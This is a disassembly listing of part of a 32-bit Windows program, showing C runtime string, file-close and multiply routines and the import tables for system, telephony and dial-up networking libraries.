loc_100C270:				; CODE XREF: ___ascii_stricmp+1Cj
					; ___ascii_stricmp+3Cj
		or	al, al
		jz	short loc_100C2A2
		mov	al, [esi]
		inc	esi
		mov	ah, [edi]
		inc	edi
		cmp	ah, al
		jz	short loc_100C270
		sub	al, 41h
		cmp	al, 1Ah
		sbb	cl, cl
		and	cl, 20h
		add	al, cl
		add	al, 41h
		xchg	ah, al
		sub	al, 41h
		cmp	al, 1Ah
		sbb	cl, cl
		and	cl, 20h
		add	al, cl
		add	al, 41h
		cmp	al, ah
		jz	short loc_100C270
		sbb	al, al
		sbb	al, 0FFh

loc_100C2A2:				; CODE XREF: ___ascii_stricmp+12j
		movsx	eax, al
		pop	ebx
		pop	esi
		pop	edi
		leave
		retn
___ascii_stricmp endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


__allmul	proc near

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch
arg_C		= dword	ptr  10h

		mov	eax, [esp+arg_4]
		mov	ecx, [esp+arg_C]
		or	ecx, eax
		mov	ecx, [esp+arg_8]
		jnz	short loc_100C2C9
		mov	eax, [esp+arg_0]
		mul	ecx
		retn	10h
; ---------------------------------------------------------------------------

loc_100C2C9:				; CODE XREF: __allmul+Ej
		push	ebx
		mul	ecx
		mov	ebx, eax
		mov	eax, [esp+4+arg_0]
		mul	[esp+4+arg_C]
		add	ebx, eax
		mov	eax, [esp+4+arg_0]
		mul	ecx
		add	edx, ebx
		pop	ebx
		retn	10h
__allmul	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

___ascii_strnicmp proc near		; CODE XREF: __strnicmp+15j

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	edi
		push	esi
		push	ebx
		mov	ecx, [ebp+arg_8]
		or	ecx, ecx
		jz	short loc_100C344
		mov	esi, [ebp+arg_0]
		mov	edi, [ebp+arg_4]
		mov	bh, 41h
		mov	bl, 5Ah
		mov	dh, 20h
		lea	ecx, [ecx+0]

loc_100C30C:				; CODE XREF: ___ascii_strnicmp+43j
		mov	ah, [esi]
		or	ah, ah
		mov	al, [edi]
		jz	short loc_100C335
		or	al, al
		jz	short loc_100C335
		inc	esi
		inc	edi
		cmp	ah, bh
		jb	short loc_100C324
		cmp	ah, bl
		ja	short loc_100C324
		add	ah, dh

loc_100C324:				; CODE XREF: ___ascii_strnicmp+2Cj
					; ___ascii_strnicmp+30j
		cmp	al, bh
		jb	short loc_100C32E
		cmp	al, bl
		ja	short loc_100C32E
		add	al, dh

loc_100C32E:				; CODE XREF: ___ascii_strnicmp+36j
					; ___ascii_strnicmp+3Aj
		cmp	ah, al
		jnz	short loc_100C33B
		dec	ecx
		jnz	short loc_100C30C

loc_100C335:				; CODE XREF: ___ascii_strnicmp+22j
					; ___ascii_strnicmp+26j
		xor	ecx, ecx
		cmp	ah, al
		jz	short loc_100C344

loc_100C33B:				; CODE XREF: ___ascii_strnicmp+40j
		mov	ecx, 0FFFFFFFFh
		jb	short loc_100C344
		neg	ecx

loc_100C344:				; CODE XREF: ___ascii_strnicmp+Bj
					; ___ascii_strnicmp+49j ...
		mov	eax, ecx
		pop	ebx
		pop	esi
		pop	edi
		leave
		retn
___ascii_strnicmp endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl fclose(FILE *File)
_fclose		proc near		; CODE XREF: __fcloseall+24p

File		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, [ebp+File]
		mov	eax, [esi+0Ch]
		push	edi
		or	edi, 0FFFFFFFFh
		test	al, 40h
		jz	short loc_100C369
		or	eax, 0FFFFFFFFh
		jmp	short loc_100C3A3
; ---------------------------------------------------------------------------

loc_100C369:				; CODE XREF: _fclose+12j
		test	al, 83h
		jz	short loc_100C3A1
		push	esi
		call	__flush
		push	esi
		mov	edi, eax
		call	__freebuf
		push	dword ptr [esi+10h] ; int
		call	__close
		add	esp, 0Ch
		test	eax, eax
		jge	short loc_100C38F
		or	edi, 0FFFFFFFFh
		jmp	short loc_100C3A1
; ---------------------------------------------------------------------------

loc_100C38F:				; CODE XREF: _fclose+38j
		mov	eax, [esi+1Ch]
		test	eax, eax
		jz	short loc_100C3A1
		push	eax		; Memory
		call	_free
		and	dword ptr [esi+1Ch], 0
		pop	ecx

loc_100C3A1:				; CODE XREF: _fclose+1Bj _fclose+3Dj ...
		mov	eax, edi

loc_100C3A3:				; CODE XREF: _fclose+17j
		and	dword ptr [esi+0Ch], 0
		pop	edi
		pop	esi
		pop	ebp
		retn
_fclose		endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl _commit(int)
__commit	proc near		; CODE XREF: _fflush+2Fp

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		cmp	eax, __nhandle
		jnb	short loc_100C3FD
		mov	ecx, eax
		sar	ecx, 5
		mov	ecx, ___pioinfo[ecx*4]
		mov	edx, eax
		and	edx, 1Fh
		test	byte ptr [ecx+edx*8+4],	1
		jz	short loc_100C3FD
		push	eax		; int
		call	__get_osfhandle
		pop	ecx
		push	eax		; hFile
		call	ds:__imp__FlushFileBuffers@4 ; FlushFileBuffers(x)
		test	eax, eax
		jnz	short loc_100C3F2
		call	ds:__imp__GetLastError@0 ; GetLastError()
		jmp	short loc_100C3F4
; ---------------------------------------------------------------------------

loc_100C3F2:				; CODE XREF: __commit+38j
		xor	eax, eax

loc_100C3F4:				; CODE XREF: __commit+40j
		test	eax, eax
		jz	short loc_100C40A
		mov	__doserrno, eax

loc_100C3FD:				; CODE XREF: __commit+Ej __commit+26j
		mov	_errno,	9
		or	eax, 0FFFFFFFFh

loc_100C40A:				; CODE XREF: __commit+46j
		pop	ebp
		retn
__commit	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl _close(int)
__close		proc near		; CODE XREF: _fclose+2Ep

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ebx
		mov	ebx, [ebp+arg_0]
		cmp	ebx, __nhandle
		push	esi
		push	edi
		jnb	loc_100C4B8
		mov	eax, ebx
		sar	eax, 5
		mov	esi, ebx
		and	esi, 1Fh
		lea	edi, ds:1011B40h[eax*4]
		mov	eax, [edi]
		shl	esi, 3
		test	byte ptr [eax+esi+4], 1
		jz	short loc_100C4B8
		push	ebx		; int
		call	__get_osfhandle
		cmp	eax, 0FFFFFFFFh
		pop	ecx
		jz	short loc_100C491
		cmp	ebx, 1
		jz	short loc_100C45B
		cmp	ebx, 2
		jnz	short loc_100C474

loc_100C45B:				; CODE XREF: __close+43j
		push	2		; int
		call	__get_osfhandle
		push	1		; int
		mov	ebx, eax
		call	__get_osfhandle
		pop	ecx
		cmp	eax, ebx
		mov	ebx, [ebp+arg_0]
		pop	ecx
		jz	short loc_100C491

loc_100C474:				; CODE XREF: __close+48j
		push	ebx		; int
		call	__get_osfhandle
		pop	ecx
		push	eax		; hObject
		call	ds:__imp__CloseHandle@4	; CloseHandle(x)
		test	eax, eax
		jnz	short loc_100C491
		call	ds:__imp__GetLastError@0 ; GetLastError()
		mov	[ebp+arg_0], eax
		jmp	short loc_100C495
; ---------------------------------------------------------------------------

loc_100C491:				; CODE XREF: __close+3Ej __close+61j ...
		and	[ebp+arg_0], 0

loc_100C495:				; CODE XREF: __close+7Ej
		push	ebx
		call	__free_osfhnd
		cmp	[ebp+arg_0], 0
		mov	eax, [edi]
		pop	ecx
		mov	byte ptr [eax+esi+4], 0
		jz	short loc_100C4B4
		push	[ebp+arg_0]
		call	__dosmaperr
		pop	ecx
		jmp	short loc_100C4C9
; ---------------------------------------------------------------------------

loc_100C4B4:				; CODE XREF: __close+96j
		xor	eax, eax
		jmp	short loc_100C4CC
; ---------------------------------------------------------------------------

loc_100C4B8:				; CODE XREF: __close+11j __close+32j
		and	__doserrno, 0
		mov	_errno,	9

loc_100C4C9:				; CODE XREF: __close+A1j
		or	eax, 0FFFFFFFFh

loc_100C4CC:				; CODE XREF: __close+A5j
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn
__close		endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

__freebuf	proc near		; CODE XREF: _fclose+26p

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, [ebp+arg_0]
		mov	eax, [esi+0Ch]
		test	al, 83h
		jz	short loc_100C503
		test	al, 8
		jz	short loc_100C503
		push	dword ptr [esi+8] ; Memory
		call	_free
		and	word ptr [esi+0Ch], 0FBF7h
		xor	eax, eax
		pop	ecx
		mov	[esi], eax
		mov	[esi+8], eax
		mov	[esi+4], eax

loc_100C503:				; CODE XREF: __freebuf+Ej
					; __freebuf+12j
		pop	esi
		pop	ebp
		retn
__freebuf	endp

; ---------------------------------------------------------------------------
		align 10h
; [00000005 BYTES: COLLAPSED CHUNK OF FUNCTION ___from_strstr_to_strchr. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION _strchr. PRESS KEYPAD "+"	TO EXPAND]
; [000000B6 BYTES: COLLAPSED FUNCTION ___from_strstr_to_strchr.	PRESS KEYPAD "+" TO EXPAND]
		db 6 dup(0CCh)
; [00000006 BYTES: COLLAPSED FUNCTION RtlUnwind(x,x,x,x). PRESS	KEYPAD "+" TO EXPAND]
		db 6 dup(0CCh)
; [00000006 BYTES: COLLAPSED FUNCTION lineShutdown(x). PRESS KEYPAD "+"	TO EXPAND]
		db 6 dup(0CCh)
; [00000006 BYTES: COLLAPSED FUNCTION lineTranslateAddressW(x,x,x,x,x,x,x). PRESS KEYPAD "+" TO	EXPAND]
		db 6 dup(0CCh)
; [00000006 BYTES: COLLAPSED FUNCTION lineNegotiateAPIVersion(x,x,x,x,x,x). PRESS KEYPAD "+" TO	EXPAND]
		db 6 dup(0CCh)
; [00000006 BYTES: COLLAPSED FUNCTION lineInitialize(x,x,x,x,x). PRESS KEYPAD "+" TO EXPAND]
		db 6 dup(0CCh)
; [00000006 BYTES: COLLAPSED FUNCTION lineTranslateDialogW(x,x,x,x,x). PRESS KEYPAD "+"	TO EXPAND]
		db 6 dup(0CCh)
; [00000006 BYTES: COLLAPSED FUNCTION RasHangUpW(x). PRESS KEYPAD "+" TO EXPAND]
		db 6 dup(0CCh)
; [00000006 BYTES: COLLAPSED FUNCTION RasGetConnectStatusW(x,x). PRESS KEYPAD "+" TO EXPAND]
		db 6 dup(0CCh)
; [00000006 BYTES: COLLAPSED FUNCTION RasEnumConnectionsW(x,x,x). PRESS	KEYPAD "+" TO EXPAND]
__IMPORT_DESCRIPTOR_ADVAPI32 dd	rva off_100C6E8	; Import Name Table
		dd 0FFFFFFFFh		; Time stamp
		dd 0FFFFFFFFh		; Forwarder Chain
		dd rva aAdvapi32_dll	; DLL Name
		dd rva __imp__RegQueryValueW@16	; Import Address Table
__IMPORT_DESCRIPTOR_KERNEL32 dd	rva off_100C714	; Import Name Table
		dd 0FFFFFFFFh		; Time stamp
		dd 0FFFFFFFFh		; Forwarder Chain
		dd rva aKernel32_dll	; DLL Name
		dd rva __imp__LocalAlloc@8 ; Import Address Table
__IMPORT_DESCRIPTOR_GDI32 dd rva off_100C700 ; Import Name Table
		dd 0FFFFFFFFh		; Time stamp
		dd 0FFFFFFFFh		; Forwarder Chain
		dd rva aGdi32_dll	; DLL Name
		dd rva __imp__GetObjectW@12 ; Import Address Table
__IMPORT_DESCRIPTOR_USER32 dd rva off_100C894 ;	Import Name Table
		dd 0FFFFFFFFh		; Time stamp
		dd 0FFFFFFFFh		; Forwarder Chain
		dd rva aUser32_dll	; DLL Name
		dd rva __imp__CallNextHookEx@16	; Import Address Table
__IMPORT_DESCRIPTOR_SHELL32 dd rva off_100C874 ; Import	Name Table
		dd 0FFFFFFFFh		; Time stamp
		dd 0FFFFFFFFh		; Forwarder Chain
		dd rva aShell32_dll	; DLL Name
		dd rva __imp__ShellExecuteW@24 ; Import	Address	Table
__IMPORT_DESCRIPTOR_TAPI32 dd rva off_100C87C ;	Import Name Table
		dd 0FFFFFFFFh		; Time stamp
		dd 0FFFFFFFFh		; Forwarder Chain
		dd rva aTapi32_dll	; DLL Name
		dd rva __imp__lineTranslateAddressW@28 ; Import	Address	Table
__IMPORT_DESCRIPTOR_RASAPI32 dd	rva off_100C864	; Import Name Table
		dd 0FFFFFFFFh		; Time stamp
		dd 0FFFFFFFFh		; Forwarder Chain
		dd rva aRasapi32_dll	; DLL Name
		dd rva __imp__RasGetConnectStatusW@8 ; Import Address Table
__NULL_IMPORT_DESCRIPTOR dd 5 dup(0)
;
; Import names for ADVAPI32.dll
;
off_100C6E8	dd rva word_100C8E8	; DATA XREF: .text:__IMPORT_DESCRIPTOR_ADVAPI32o
		dd rva word_100C8FA
		dd rva word_100C908
		dd rva word_100C91C
		dd rva word_100C92A
		dd 0
;
; Import names for GDI32.dll
;
off_100C700	dd rva word_100CF38	; DATA XREF: .text:__IMPORT_DESCRIPTOR_GDI32o
		dd rva word_100CF22
		dd rva word_100CF12
		dd rva word_100CF00
		dd 0
;
; Import names for KERNEL32.dll
;
off_100C714	dd rva word_100C984	; DATA XREF: .text:__IMPORT_DESCRIPTOR_KERNEL32o
		dd rva word_100C992
		dd rva word_100C9A0
		dd rva word_100C9AC
		dd rva word_100C9BE
		dd rva word_100C9D4
		dd rva word_100C9EA
		dd rva word_100C9FC
		dd rva word_100CA0A
		dd rva word_100CA18
		dd rva word_100CA2A
		dd rva word_100CA3A
		dd rva word_100CA4A
		dd rva word_100CA58
		dd rva word_100CA64
		dd rva word_100CA70
		dd rva word_100CA8C
		dd rva word_100CA9C
		dd rva word_100CAA8
		dd rva word_100CABC
		dd rva word_100CAC8
		dd rva word_100CAD8
		dd rva word_100CAE6
		dd rva word_100CAFC
		dd rva word_100CB0E
		dd rva word_100CB1A
		dd rva word_100CB2C
		dd rva word_100CB40
		dd rva word_100CB58
		dd rva word_100CB6C
		dd rva word_100CB86
		dd rva word_100CB96
		dd rva word_100CBB0
		dd rva word_100CBC4
		dd rva word_100CBD8
		dd rva word_100CBF4
		dd rva word_100C976
		dd rva word_100CC24
		dd rva word_100CC36
		dd rva word_100CC46
		dd rva word_100CC5A
		dd rva word_100CC6A
		dd rva word_100CC80
		dd rva word_100CC9A
		dd rva word_100CCB2
		dd rva word_100CCCC
		dd rva word_100CCE2
		dd rva word_100CCFC
		dd rva word_100CD0E
		dd rva word_100CD1C
		dd rva word_100CD2A
		dd rva word_100CD38
		dd rva word_100CD46
		dd rva word_100CD52
		dd rva word_100CD5E
		dd rva word_100CD6E
		dd rva word_100CD84
		dd rva word_100CD94
		dd rva word_100CDA0
		dd rva word_100CDB6
		dd rva word_100CDC8
		dd rva word_100CDDE
		dd rva word_100CDEE
		dd rva word_100CE00
		dd rva word_100CE12
		dd rva word_100CE24
		dd rva word_100CE34
		dd rva word_100CE3E
		dd rva word_100CE4A
		dd rva word_100CE5A
		dd rva word_100CE68
		dd rva word_100CE74
		dd rva word_100CE8A
		dd rva word_100CE9A
		dd rva word_100CEAC
		dd rva word_100CEBC
		dd rva word_100CECC
		dd rva word_100CEDE
		dd rva word_100C96E
		dd rva word_100C962
		dd rva word_100C956
		dd rva word_100C94A
		dd rva word_100CC12
		dd 0
;
; Import names for RASAPI32.dll
;
off_100C864	dd rva word_100D140	; DATA XREF: .text:__IMPORT_DESCRIPTOR_RASAPI32o
		dd rva word_100D132
		dd rva word_100D158
		dd 0
;
; Import names for SHELL32.dll
;
off_100C874	dd rva word_100D09E	; DATA XREF: .text:__IMPORT_DESCRIPTOR_SHELL32o
		dd 0
;
; Import names for TAPI32.dll
;
off_100C87C	dd rva word_100D0CA	; DATA XREF: .text:__IMPORT_DESCRIPTOR_TAPI32o
		dd rva word_100D0BA
		dd rva word_100D0E2
		dd rva word_100D0FC
		dd rva word_100D10E
		dd 0
;
; Import names for USER32.dll
;
off_100C894	dd rva word_100CFC4	; DATA XREF: .text:__IMPORT_DESCRIPTOR_USER32o
		dd rva word_100CFD6
		dd rva word_100CFE8
		dd rva word_100CFFC
		dd rva word_100D012
		dd rva word_100D028
		dd rva word_100CFB4
		dd rva word_100D04A
		dd rva word_100D056
		dd rva word_100D062
		dd rva word_100D074
		dd rva word_100D082
		dd rva word_100CFA2
		dd rva word_100CF96
		dd rva word_100CF86
		dd rva word_100CF78
		dd rva word_100CF6A
		dd rva word_100CF50
		dd rva word_100CF5C
		dd rva word_100D03A
		dd 0
word_100C8E8	dw 1EFh			; DATA XREF: .text:off_100C6E8o
		db 'RegQueryValueW',0
		align 2
word_100C8FA	dw 1CAh			; DATA XREF: .text:0100C6ECo
		db 'RegCloseKey',0
word_100C908	dw 1EEh			; DATA XREF: .text:0100C6F0o
		db 'RegQueryValueExW',0
		align 4
word_100C91C	dw 1E5h			; DATA XREF: .text:0100C6F4o
		db 'RegOpenKeyW',0
word_100C92A	dw 1D4h			; DATA XREF: .text:0100C6F8o
		db 'RegDeleteValueW',0
aAdvapi32_dll	db 'ADVAPI32.dll',0     ; DATA XREF: .text:0100C654o
		align 2
word_100C94A	dw 3B4h			; DATA XREF: .text:0100C858o
		db 'lstrlenW',0
		align 2
word_100C956	dw 3A8h			; DATA XREF: .text:0100C854o
		db 'lstrcmpW',0
		align 2
word_100C962	dw 24Bh			; DATA XREF: .text:0100C850o
		db 'LocalFree',0
word_100C96E	dw 33Eh			; DATA XREF: .text:0100C84Co
		db 'Sleep',0
word_100C976	dw 31h			; DATA XREF: .text:0100C7A4o
		db 'CloseHandle',0
word_100C984	dw 247h			; DATA XREF: .text:off_100C714o
		db 'LocalAlloc',0
		align 2
word_100C992	dw 0B6h			; DATA XREF: .text:0100C718o
		db 'ExitProcess',0
word_100C9A0	dw 38Bh			; DATA XREF: .text:0100C71Co
		db 'WriteFile',0
word_100C9AC	dw 306h			; DATA XREF: .text:0100C720o
		db 'SetFilePointer',0
		align 2
word_100C9BE	dw 13Ch			; DATA XREF: .text:0100C724o
		db 'GetCurrentProcessId',0
word_100C9D4	dw 13Eh			; DATA XREF: .text:0100C728o
		db 'GetCurrentThreadId',0
		align 2
word_100C9EA	dw 10Ah			; DATA XREF: .text:0100C72Co
		db 'GetCommandLineW',0
word_100C9FC	dw 1F1h			; DATA XREF: .text:0100C730o
		db 'GlobalFree',0
		align 2
word_100CA0A	dw 0F0h			; DATA XREF: .text:0100C734o
		db 'FreeLibrary',0
word_100CA18	dw 197h			; DATA XREF: .text:0100C738o
		db 'GetProcAddress',0
		align 2
word_100CA2A	dw 168h			; DATA XREF: .text:0100C73Co
		db 'GetLastError',0
		align 2
word_100CA3A	dw 244h			; DATA XREF: .text:0100C740o
		db 'LoadLibraryW',0
		align 2
word_100CA4A	dw 1EAh			; DATA XREF: .text:0100C744o
		db 'GlobalAlloc',0
word_100CA58	dw 3B1h			; DATA XREF: .text:0100C748o
		db 'lstrcpynW',0
word_100CA64	dw 3AEh			; DATA XREF: .text:0100C74Co
		db 'lstrcpyW',0
		align 10h
word_100CA70	dw 194h			; DATA XREF: .text:0100C750o
		db 'GetPrivateProfileStringW',0
		align 4
word_100CA8C	dw 1DCh			; DATA XREF: .text:0100C754o
		db 'GetVersionExW',0
word_100CA9C	dw 3ABh			; DATA XREF: .text:0100C758o
		db 'lstrcmpiW',0
word_100CAA8	dw 178h			; DATA XREF: .text:0100C75Co
		db 'GetModuleHandleW',0
		align 4
word_100CABC	dw 0CCh			; DATA XREF: .text:0100C760o
		db 'FindClose',0
word_100CAC8	dw 0DAh			; DATA XREF: .text:0100C764o
		db 'FindNextFileW',0
word_100CAD8	dw 82h			; DATA XREF: .text:0100C768o
		db 'DeleteFileW',0
word_100CAE6	dw 305h			; DATA XREF: .text:0100C76Co
		db 'SetFileAttributesW',0
		align 4
word_100CAFC	dw 0D3h			; DATA XREF: .text:0100C770o
		db 'FindFirstFileW',0
		align 2
word_100CB0E	dw 3A5h			; DATA XREF: .text:0100C774o
		db 'lstrcatW',0
		align 2
word_100CB1A	dw 38h			; DATA XREF: .text:0100C778o
		db 'CompareStringW',0
		align 4
word_100CB2C	dw 162h			; DATA XREF: .text:0100C77Co
		db 'GetFullPathNameW',0
		align 10h
word_100CB40	dw 18Eh			; DATA XREF: .text:0100C780o
		db 'GetPrivateProfileIntW',0
word_100CB58	dw 69h			; DATA XREF: .text:0100C784o
		db 'CreateSemaphoreW',0
		align 4
word_100CB6C	dw 291h			; DATA XREF: .text:0100C788o
		db 'QueryPerformanceCounter',0
word_100CB86	dw 1D1h			; DATA XREF: .text:0100C78Co
		db 'GetTickCount',0
		align 2
word_100CB96	dw 1BDh			; DATA XREF: .text:0100C790o
		db 'GetSystemTimeAsFileTime',0
word_100CBB0	dw 346h			; DATA XREF: .text:0100C794o
		db 'TerminateProcess',0
		align 4
word_100CBC4	dw 13Bh			; DATA XREF: .text:0100C798o
		db 'GetCurrentProcess',0
word_100CBD8	dw 357h			; DATA XREF: .text:0100C79Co
		db 'UnhandledExceptionFilter',0
		align 4
word_100CBF4	dw 332h			; DATA XREF: .text:0100C7A0o
		db 'SetUnhandledExceptionFilter',0
word_100CC12	dw 1ACh			; DATA XREF: .text:0100C85Co
		db 'GetStartupInfoA',0
word_100CC24	dw 109h			; DATA XREF: .text:0100C7A8o
		db 'GetCommandLineA',0
word_100CC36	dw 1DBh			; DATA XREF: .text:0100C7ACo
		db 'GetVersionExA',0
word_100CC46	dw 175h			; DATA XREF: .text:0100C7B0o
		db 'GetModuleHandleA',0
		align 2
word_100CC5A	dw 1AEh			; DATA XREF: .text:0100C7B4o
		db 'GetStdHandle',0
		align 2
word_100CC6A	dw 173h			; DATA XREF: .text:0100C7B8o
		db 'GetModuleFileNameA',0
		align 10h
word_100CC80	dw 0EEh			; DATA XREF: .text:0100C7BCo
		db 'FreeEnvironmentStringsA',0
word_100CC9A	dw 14Dh			; DATA XREF: .text:0100C7C0o
		db 'GetEnvironmentStrings',0
word_100CCB2	dw 0EFh			; DATA XREF: .text:0100C7C4o
		db 'FreeEnvironmentStringsW',0
word_100CCCC	dw 37Eh			; DATA XREF: .text:0100C7C8o
		db 'WideCharToMultiByte',0
word_100CCE2	dw 14Fh			; DATA XREF: .text:0100C7CCo
		db 'GetEnvironmentStringsW',0
		align 4
word_100CCFC	dw 30Fh			; DATA XREF: .text:0100C7D0o
		db 'SetHandleCount',0
		align 2
word_100CD0E	dw 15Eh			; DATA XREF: .text:0100C7D4o
		db 'GetFileType',0
word_100CD1C	dw 206h			; DATA XREF: .text:0100C7D8o
		db 'HeapDestroy',0
word_100CD2A	dw 204h			; DATA XREF: .text:0100C7DCo
		db 'HeapCreate',0
		align 4
word_100CD38	dw 36Dh			; DATA XREF: .text:0100C7E0o
		db 'VirtualFree',0
word_100CD46	dw 208h			; DATA XREF: .text:0100C7E4o
		db 'HeapFree',0
		align 2
word_100CD52	dw 202h			; DATA XREF: .text:0100C7E8o
		db 'HeapAlloc',0
word_100CD5E	dw 233h			; DATA XREF: .text:0100C7ECo
		db 'LCMapStringA',0
		align 2
word_100CD6E	dw 264h			; DATA XREF: .text:0100C7F0o
		db 'MultiByteToWideChar',0
word_100CD84	dw 234h			; DATA XREF: .text:0100C7F4o
		db 'LCMapStringW',0
		align 4
word_100CD94	dw 0FDh			; DATA XREF: .text:0100C7F8o
		db 'GetCPInfo',0
word_100CDA0	dw 1D5h			; DATA XREF: .text:0100C7FCo
		db 'GetUserDefaultLCID',0
		align 2
word_100CDB6	dw 16Bh			; DATA XREF: .text:0100C800o
		db 'GetLocaleInfoA',0
		align 4
word_100CDC8	dw 0ACh			; DATA XREF: .text:0100C804o
		db 'EnumSystemLocalesA',0
		align 2
word_100CDDE	dw 230h			; DATA XREF: .text:0100C808o
		db 'IsValidLocale',0
word_100CDEE	dw 22Eh			; DATA XREF: .text:0100C80Co
		db 'IsValidCodePage',0
word_100CE00	dw 1AFh			; DATA XREF: .text:0100C810o
		db 'GetStringTypeA',0
		align 2
word_100CE12	dw 1B2h			; DATA XREF: .text:0100C814o
		db 'GetStringTypeW',0
		align 4
word_100CE24	dw 241h			; DATA XREF: .text:0100C818o
		db 'LoadLibraryA',0
		align 4
word_100CE34	dw 0F6h			; DATA XREF: .text:0100C81Co
		db 'GetACP',0
		align 2
word_100CE3E	dw 18Ah			; DATA XREF: .text:0100C820o
		db 'GetOEMCP',0
		align 2
word_100CE4A	dw 36Ah			; DATA XREF: .text:0100C824o
		db 'VirtualAlloc',0
		align 2
word_100CE5A	dw 20Ch			; DATA XREF: .text:0100C828o
		db 'HeapReAlloc',0
word_100CE68	dw 2C4h			; DATA XREF: .text:0100C82Co
		db 'RtlUnwind',0
word_100CE74	dw 21Ah			; DATA XREF: .text:0100C830o
		db 'InterlockedExchange',0
word_100CE8A	dw 372h			; DATA XREF: .text:0100C834o
		db 'VirtualQuery',0
		align 2
word_100CE9A	dw 370h			; DATA XREF: .text:0100C838o
		db 'VirtualProtect',0
		align 4
word_100CEAC	dw 1B8h			; DATA XREF: .text:0100C83Co
		db 'GetSystemInfo',0
word_100CEBC	dw 321h			; DATA XREF: .text:0100C840o
		db 'SetStdHandle',0
		align 4
word_100CECC	dw 16Ch			; DATA XREF: .text:0100C844o
		db 'GetLocaleInfoW',0
		align 2
word_100CEDE	dw 0E6h			; DATA XREF: .text:0100C848o
		db 'FlushFileBuffers',0
		align 2
aKernel32_dll	db 'KERNEL32.dll',0     ; DATA XREF: .text:0100C668o
		align 10h
word_100CF00	dw 1A5h			; DATA XREF: .text:0100C70Co
		db 'GetStockObject',0
		align 2
word_100CF12	dw 8Fh			; DATA XREF: .text:0100C708o
		db 'DeleteObject',0
		align 2
word_100CF22	dw 3Dh			; DATA XREF: .text:0100C704o
		db 'CreateFontIndirectW',0
word_100CF38	dw 197h			; DATA XREF: .text:off_100C700o
		db 'GetObjectW',0
		align 2
aGdi32_dll	db 'GDI32.dll',0        ; DATA XREF: .text:0100C67Co
word_100CF50	dw 2D9h			; DATA XREF: .text:0100C8D8o
		db 'wsprintfW',0
word_100CF5C	dw 1C9h			; DATA XREF: .text:0100C8DCo
		db 'LoadStringW',0
word_100CF6A	dw 1E3h			; DATA XREF: .text:0100C8D4o
		db 'MessageBoxW',0
word_100CF78	dw 111h			; DATA XREF: .text:0100C8D0o
		db 'GetDlgItem',0
		align 2
word_100CF86	dw 200h			; DATA XREF: .text:0100C8CCo
		db 'PostMessageW',0
		align 2
word_100CF96	dw 0C6h			; DATA XREF: .text:0100C8C8o
		db 'EndDialog',0
word_100CFA2	dw 254h			; DATA XREF: .text:0100C8C4o
		db 'SetDlgItemTextW',0
word_100CFB4	dw 240h			; DATA XREF: .text:0100C8ACo
		db 'SendMessageW',0
		align 4
word_100CFC4	dw 1Ah			; DATA XREF: .text:off_100C894o
		db 'CallNextHookEx',0
		align 2
word_100CFD6	dw 0EBh			; DATA XREF: .text:0100C898o
		db 'GetActiveWindow',0
word_100CFE8	dw 28Bh			; DATA XREF: .text:0100C89Co
		db 'SetWindowsHookExW',0
word_100CFFC	dw 2AEh			; DATA XREF: .text:0100C8A0o
		db 'UnhookWindowsHookEx',0
word_100D012	dw 237h			; DATA XREF: .text:0100C8A4o
		db 'SendDlgItemMessageW',0
word_100D028	dw 114h			; DATA XREF: .text:0100C8A8o
		db 'GetDlgItemTextW',0
word_100D03A	dw 0C4h			; DATA XREF: .text:0100C8E0o
		db 'EnableWindow',0
		align 2
word_100D04A	dw 256h			; DATA XREF: .text:0100C8B0o
		db 'SetFocus',0
		align 2
word_100D056	dw 2D3h			; DATA XREF: .text:0100C8B4o
		db 'WinHelpW',0
		align 2
word_100D062	dw 9Fh			; DATA XREF: .text:0100C8B8o
		db 'DialogBoxParamW',0
word_100D074	dw 37h			; DATA XREF: .text:0100C8BCo
		db 'CharUpperW',0
		align 2
word_100D082	dw 0E1h			; DATA XREF: .text:0100C8C0o
		db 'ExitWindowsEx',0
aUser32_dll	db 'USER32.dll',0       ; DATA XREF: .text:0100C690o
		align 2
word_100D09E	dw 10Bh			; DATA XREF: .text:off_100C874o
		db 'ShellExecuteW',0
aShell32_dll	db 'SHELL32.dll',0      ; DATA XREF: .text:0100C6A4o
word_100D0BA	dw 0D0h			; DATA XREF: .text:0100C880o
		db 'lineShutdown',0
		align 2
word_100D0CA	dw 0D4h			; DATA XREF: .text:off_100C87Co
		db 'lineTranslateAddressW',0
word_100D0E2	dw 94h			; DATA XREF: .text:0100C884o
		db 'lineNegotiateAPIVersion',0
word_100D0FC	dw 8Bh			; DATA XREF: .text:0100C888o
		db 'lineInitialize',0
		align 2
word_100D10E	dw 0D7h			; DATA XREF: .text:0100C88Co
		db 'lineTranslateDialogW',0
		align 2
aTapi32_dll	db 'TAPI32.dll',0       ; DATA XREF: .text:0100C6B8o
		align 2
word_100D132	dw 4Ch			; DATA XREF: .text:0100C868o
		db 'RasHangUpW',0
		align 10h
word_100D140	dw 2Dh			; DATA XREF: .text:off_100C864o
		db 'RasGetConnectStatusW',0
		align 4
word_100D158	dw 1Ch			; DATA XREF: .text:0100C86Co
		db 'RasEnumConnectionsW',0
aRasapi32_dll	db 'RASAPI32.dll',0     ; DATA XREF: .text:0100C6CCo
		align 4
		dd 5 dup(0)
